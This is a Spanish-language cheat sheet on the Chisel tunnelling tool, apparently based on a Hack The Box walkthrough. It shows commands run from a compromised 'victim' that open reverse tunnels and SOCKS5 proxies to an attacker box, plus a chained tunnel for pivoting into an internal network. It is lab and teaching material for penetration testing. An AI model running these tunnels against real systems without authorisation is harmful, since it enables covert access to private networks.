# Chisel Cheat Sheet

Uso típico. Los ejemplos suponen que el cuadro de ataque es 10.10.14.3 y que el cliente se ejecuta desde 10.10.10.10.

Iniciar el servidor escuchando en 8000:

`./chisel server -p 8000 --reverse`

De la víctima:

| Dominio | Notas |
|---------|-------|
|`chisel client 10.10.14.3:8000 R:80:127.0.0.1:80` |	Escuchar el ataque en 80, reenviar al puerto local 80 en el cliente |
|`chisel client 10.10.14.3:8000 R:4444:10.10.10.240:80` |	Escuche el ataque a 4444, reenvíe al puerto 80 10.10.10.240 |
|`chisel client 10.10.14.3:8000 R:socks` | Crear un receptor `SOCKS5` en 1080 en caso de ataque, proxy a través del cliente |

El autor de Chisel lo describe así:
`
Chisel es un túnel TCP rápido, transportado a través de HTTP, protegido mediante SSH. Un único ejecutable que incluye tanto al cliente como al servidor. Escrito en Go (golang). Chisel es principalmente útil para atravesar cortafuegos, aunque también se puede utilizar para proporcionar un punto final seguro en su red. Chisel es muy similar a Crowbar, aunque logra un rendimiento mucho mayor.
`

Para mí, eso significa que puedo ejecutar un servidor en mi equipo de ataque y luego conectarme a él desde los equipos de destino. Al realizar esa conexión, puedo definir diferentes tipos de túneles que quiero configurar.

## Instalación
```console
d4nex@kali:~$ git clone https://github.com/jpillora/chisel.git
Cloning into 'chisel'...
remote: Enumerating objects: 33, done.
remote: Counting objects: 100% (33/33), done.
remote: Compressing objects: 100% (27/27), done.
remote: Total 1151 (delta 7), reused 18 (delta 5), pack-reused 1118
Receiving objects: 100% (1151/1151), 3.31 MiB | 19.03 MiB/s, done.
Resolving deltas: 100% (416/416), done.
```

Ahora, dentro del directorio chisel, ejecutaré `go build`. Puede que descargue algunos bits adicionales y, cuando termine, tendré un binario de chisel:
```
d4nex@kali:~$ ls -lh chisel 
-rwxr-xr-x 1 root root 10M Dec 17 06:47 chisel
```

Ippsec señala que se trata de 10 MB, un archivo de gran tamaño para moverlo al destino en algunos entornos. Muestra cómo se puede ejecutar `go build -ldflags="-s -w"` y reducir a 7,5 MB (donde `-s` es “Omitir toda la información de símbolos del archivo de salida” o eliminar, y `-w` es “Omitir la tabla de símbolos DWARF”). También muestra cómo upxreducirlo a 2,9 MB si el ancho de banda es limitado.

## Servidor

Primero, configuraré el servidor en mi equipo local. El binario que creé actúa como cliente y servidor, y si ejecuto `./chisel --help`, veré lo siguiente:
```console
d4nex@kali:~$ ./chisel --help

  Usage: chisel [command] [--help]

  Version: 0.0.0-src

  Commands:
    server - runs chisel in server mode
    client - runs chisel in client mode

  Read more:
    https://github.com/jpillora/chisel
```

Entonces, para iniciar el servidor, ejecutaré `./chisel server -p [port] --reverse`. `-p` me permitirá especificar a chisel en qué puerto escucha. Si no proporciono esto, intentará 8080 de forma predeterminada, lo que a menudo falla ya que casi siempre tengo Burp ejecutándose en 8080. `--reverse` le dice al servidor que quiero que los clientes que se conectan puedan definir túneles inversos. Esto significa que los clientes que se conectan pueden abrir puertos de escucha en mi caja de ataque. Eso es lo que quiero aquí, pero tenga en cuenta lo que se le permite hacer.

Hay otras opciones que quizás quiera añadir también:

`--host` me permite definir en qué interfaz escuchar, siendo todas ellas (0.0.0.0) las predeterminadas.
`--key` Me permite generar un par de claves que se utilizan para la conexión. Esto aporta algo de seguridad, pero, por otra parte, la clave tendrá que estar en el equipo de destino que se conecta de nuevo, de modo que cualquiera que la obtenga podrá conectarse.
`--authfile` y `--auth` permiten especificar los nombres de usuario y contraseñas necesarios para conectarse.
`-v` Activa el registro detallado en la terminal.

## Cliente 

Moveré una copia de chisel al objetivo y lo ejecutaré como `./chisel client [server ip]:[server port] [remote string] [optional more remote strings]`.

Al ejecutar esto se conectará al servidor proporcionado y creará un túnel para cada cadena remota proporcionada.

Las cadenas remotas tienen el formato `<local-host>:<local-port>:<remote-host>:<remote-port>` definido por chisel. Creo que es más intuitivo pensar en ello como `<listen-host>:<listen-port>:<forward-host>:<forward-port>`, pero utilizaré los nombres de chisel que se usan en esta publicación.

De los cuatro elementos, solo se requiere el puerto remoto. Si `local-host` no se proporciona, asumirá 0.0.0.0 en el cliente. Si `local-port` no se proporciona, se utilizará de forma predeterminada el mismo que el `remote-port`. Si `remote-host` no se proporciona, se utilizará de forma predeterminada el servidor. Puede proporcionarlo `R` para que `local-host` indique que desea escuchar en el host remoto (es decir, abrir el receptor en el servidor). En ese caso, el túnel irá en la dirección inversa.

## Ejemplos

### Socks Proxys

Del lado del atacante `./clisel server -p 8000 --reverse`.

En el cuadro que desea utilizar como proxy, ejecute `./chisel client 1.1.1.1:8000 R:socks`.

Esto iniciará un oyente que atacará el puerto `1080`, que es un `proxy SOCKS5` a través del cliente Chisel.

Texto original:
`
Ippsec mostró esto al final de su video y vale la pena verlo. chisel solo permite que el servidor actúe como un sock proxy. Pero, en el caso de Reddish, no tengo una forma de conectarme directamente a ese servidor. Usaré chisel para configurar un túnel para poder conectarme a otro chisel en la dirección opuesta:
`
```bash
./chisel server -p 8000 --reverse #En el box local, como de costumbre.
./chisel client 1.1.1.1:8000 R:8001:127.0.0.1:9001 #En el cuadro de destino. Ahora, todo lo que envíe a localhost:8001 en el cuadro de ataque se reenviará a localhost:9001 en el destino.
./chisel server -p 9001 --socks5 #En el objetivo. Ahora tengo un chisel servidor que escucha en 9001, en modo Socks, y una forma de obtener tráfico hacia ese puerto.
./chisel client localhost:8001 socks #En el cuadro de ataque. Esta conexión se reenvía a través del primer túnel y se conecta al servidor que se ejecuta en el cuadro. Ahora, mi host local está escuchando en el puerto 1080 (predeterminado, se puede cambiar con argumentos) y enviará tráfico al destino y luego lo enviará por proxy de salida.
```
Ahora puedo usar proxychains o FoxyProxy para interactuar con la red detrás del objetivo de forma natural.


